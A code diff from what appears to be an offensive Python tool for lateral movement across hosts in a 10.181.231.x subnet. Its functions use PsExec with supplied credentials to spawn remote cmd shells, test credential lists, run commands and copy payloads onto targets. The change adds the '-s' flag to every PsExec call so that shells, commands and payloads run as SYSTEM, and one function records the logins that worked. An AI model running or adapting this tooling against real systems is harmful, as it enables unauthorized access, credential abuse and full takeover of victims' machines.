@@ -518,7 +518,7 @@ def getintel(host):
 
 def rconnect(target, uname, pword):
     print("\n[+] Spawning shell\n")
-    os.system(psexec_path + r" -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))
+    os.system(psexec_path + r" -s -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))
 
 
 def credTest(creds="Profile:password", iplist="default"):
@@ -583,7 +583,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
 
     ending = tgt
     tgt = "10.181.231." + str(tgt)
-    psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
+    psexecString = psexec_path + r' -nobanner \\%s -s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
     resp = os.system(psexecString)
     if sav and tgt not in customLists[listIndex]:
         infostring = "LOGIN: " + uname + ":" + pword
@@ -629,9 +629,9 @@ def rcpyT(remote, tgt=0, uname="", pword="", payload="", index=0):  # The actual
     tgt = "10.181.231." + str(tgt)
     psexecString = ""
     if remote:
-        psexecString = psexec_path + r' -nobanner \\%s -i -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
+        psexecString = psexec_path + r' -s -nobanner \\%s -i -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
     else:
-        psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
+        psexecString = psexec_path + r' -s -nobanner \\%s -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
     resp = os.system(psexecString)
     print(resp)
     completeFlags[index] = 1
